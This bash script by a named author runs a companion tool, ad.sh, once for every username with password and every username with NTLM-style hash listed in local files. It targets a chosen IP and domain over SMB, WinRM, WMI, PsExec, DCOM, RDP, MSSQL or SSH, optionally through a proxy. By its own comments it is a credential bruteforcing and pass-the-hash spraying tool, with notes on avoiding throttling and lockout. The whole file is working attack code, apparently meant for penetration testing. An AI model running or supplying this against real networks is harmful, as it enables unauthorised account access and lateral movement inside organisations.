#!/bin/bash -u
# Eliot Roxbergh 2024
#
# Run ./ad.sh for each username and each password in file, for bruteforcing (watch out for throttling)
# (Ugly: this is a bit of a mess due to repetition/dependencies of ./ad.sh)

# Try all known credentials
FILE_PASS="known_creds.txt"
FILE_HASH="known_hashes.txt"

function print_usage {
        echo "$0 [<all/smb/smbexec/winrm/wmi/psexec/dcom/rdp/local-auth/mssql/ssh>] [<hash/pass>] [<proxy>] IP domain"
}

#if [ ! -f "$FILE" ]; then
#        echo "ERR: No file $FILE"
#        exit
#fi

if [ $# -lt 2 ]; then
        echo "ERR: too few arguments given"
        print_usage
        exit 1
fi
print_usage



## OPTIONAL ARGS ##
valid_methods=("all" "smb" "smbexec" "winrm" "wmi" "psexec" "dcom" "rdp" "local-auth" "mssql" "ssh")
if [[ " ${valid_methods[*]} " = *" $1 "* ]]; then
        METHOD="$1"
        shift
else
        # For now just exit TODO?
        echo "ERR: Please set valid method to avoid locking out"
        exit 1
fi

if [ "$1" = "hash" ] || [ "$1" = "pass" ]; then
        CRED_FORMAT="$1"
        shift
else
        CRED_FORMAT="all"
fi

if [ "$1" = "proxy" ]; then
        PROXY="proxy"
        shift
else
        PROXY=
fi
###################

IP="$1"
DOMAIN="$2"

# run for each IP-address in file
# TODO read loop may break on certain characters
# TODO repetition of code just break out to function lol
if [ "$CRED_FORMAT" = "pass" ] || [ "$CRED_FORMAT" = "all" ]; then
        FILE="$FILE_PASS"
        while read line; do
                USER=$(echo "$line" | cut -d' ' -f1)
                CRED=$(echo "$line" | cut -d' ' -f2)
                echo
                echo RUNNING: ./ad.sh "$METHOD" pass "$PROXY" "$IP" "$USER" "$CRED" "$DOMAIN"
                echo
                ./ad.sh "$METHOD" pass "$PROXY" "$IP" "$USER" "$CRED" "$DOMAIN"
        done < "$FILE"
fi
if  [ "$CRED_FORMAT" = "hash" ] || [ "$CRED_FORMAT" = "all" ]; then
        FILE="$FILE_HASH"
        while read line; do
                USER=$(echo "$line" | cut -d' ' -f1)
                CRED=$(echo "$line" | cut -d' ' -f2)
                echo
                echo RUNNING: ./ad.sh "$METHOD" hash "$PROXY" "$IP" "$USER" "$CRED" "$DOMAIN"
                echo
                ./ad.sh "$METHOD" hash "$PROXY" "$IP" "$USER" "$CRED" "$DOMAIN"
        done < "$FILE"
fi

#        echo "ERR: credential format was given but was not 'pass' or 'hash', found $CRED_FORMAT"

